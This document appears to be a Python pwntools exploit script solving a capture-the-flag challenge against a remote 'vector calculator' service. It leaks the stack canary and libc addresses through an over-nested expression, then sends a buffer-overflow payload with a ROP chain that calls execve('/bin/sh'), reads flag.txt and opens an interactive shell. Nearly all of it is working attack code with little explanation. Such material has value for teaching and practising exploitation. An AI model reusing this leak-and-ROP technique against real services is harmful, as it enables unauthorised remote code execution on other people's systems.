"""
There was a server with running vector calculator on it.
The task was to find and exploit buffer overflow.
"""

import sys
from pwn import *
from struct import *

# Utils

def par_embed(x):
    return 31 * '(' + x + 31 * ')'
    
def double_to_hex(f):
    return hex(unpack('<Q', pack('<d', f))[0])
    
def hex_to_double(h):
    c = len(h[2:])
    h = (16 - c) * '0' + h[2:]
    f = unpack('>d', h.decode("hex"))[0]
    return format(f, '.20e')
    
def int_to_bytes(i):
    return pack('<Q', i)

def get_leak(output):
    leak = output.split(', ')
    leak[0] = leak[0][1:]
    leak[7] = leak[7][:-2]
    return leak

def prep(leak, ret):
    s = 'a={' + leak[0] + ',' + leak[1] + ',' + leak[2] + ','
    s += leak[3] + ',' + leak[4] + ',' + leak[5] + ',' + leak[6]
    s += ',' + ret + '}'
    return s

# Leak
# (((((((((((((((((((((((((((((((+)))))))))))))))))))))))))))))))
# Leaked info (checked with gdb):
# leak[0] = canary
# leak[1] = buf
# leak[2] = _start 
# leak[3:4] = ? (sth on stack)
# leak[5] = stdin? (weird function, but good enough)
# leak[6] = __libc_csu_init
# leak[7] = return to main

# server = process(['./vectorcalc'], env={"LD_PRELOAD": "./libc.so.6"})
server = remote('h4x.0x04.net', 1337)
libc_elf = ELF('./libc.so.6')
execve_offset = libc_elf.symbols['execve']
server.sendline(par_embed('+'))
leak = get_leak(server.recvline())
const1 = 1010992
execve_pos = int(double_to_hex(float(leak[5])), 16) - const1
libc_base = execve_pos - execve_offset

# Input:
# par_embed(a)|NULL|newstack
# par_embed(a) changes return address (from compute) and begins ROP

# add rsp, 0x40: __fentry__+91
rop1 = libc_elf.symbols['__fentry__'] + 91
i1 = libc_base + rop1
# "/bin/sh"
rop2 = next(libc_elf.search('/bin/sh\x00'))
binsh = int_to_bytes(libc_base + rop2)
# pop rdi: offset 53 taken from main dump: 1d90 - 1d5b
ret_to_main = int(double_to_hex(float(leak[7])), 16)
i2 = int_to_bytes(ret_to_main + 53)
# pop rdx; pop rsi: __lll_unlock_wake_private+25
rop3 = libc_elf.symbols['__lll_unlock_wake_private'] + 25
i3 = int_to_bytes(libc_base + rop3)

a = hex_to_double(hex(i1))
server.sendline(prep(leak, a))

zero = int_to_bytes(0)
payload = par_embed('a') + '\x00' + i2 + binsh + i3 + zero + zero
payload += int_to_bytes(execve_pos) + '\n'

# Fgets does not stop on '\0'
server.sendline(payload)
server.recvline()
server.sendline("cat flag.txt")
server.interactive()
